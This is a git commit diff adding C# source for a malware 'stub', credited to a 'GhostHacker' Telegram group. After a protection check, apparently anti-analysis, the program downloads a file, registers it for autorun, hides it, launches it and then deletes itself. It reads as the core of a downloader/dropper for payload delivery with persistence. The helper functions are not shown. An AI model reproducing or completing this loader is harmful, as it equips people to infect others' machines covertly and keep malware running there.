234bbb198231f6db518ef8b7c146ff32836a3c34
noke6262 <158798564+noke6262@users.noreply.github.com>
2024-06-10 20:06:45 +0200

    Add files via upload

---
+++ Stub/Stub/Modules/InternalFuncs/InternalMain.cs
@@ -0,0 +1,35 @@
+﻿// Main-Functions file
+// Coded by GhostHacker - Telegram | https://t.me/GhostHackersNetwork
+
+using System.Diagnostics;
+
+namespace Stub.Modules.InternalFuncs
+{
+    internal class InternalMain
+    {
+        public static void Execute()
+        {
+            try
+            {
+                InternalAux.DownloadFile();
+
+                if (config.AutoRun)
+                {
+                    InternalAux.AddToAutoRun("XxX", config.FileLocation);
+                }
+
+                if (config.HideFile)
+                {
+                    InternalAux.HideFile(config.FileLocation);
+                }
+
+                Process.Start(config.FileLocation);
+                InternalAux.SelfRemove();
+            }
+
+            catch { InternalAux.SelfRemove(); }
+
+
+        }
+    }
+}
---
+++ Stub/Stub/Program.cs
@@ -0,0 +1,15 @@
+﻿// Coded by GhostHacker - Telegram | https://t.me/GhostHackersNetwork
+using Stub.Modules.InternalFuncs;
+using Stub.Modules.Protects;
+
+namespace Stub
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            AllChecker.Protect();
+            InternalMain.Execute();
+        }
+    }
+}
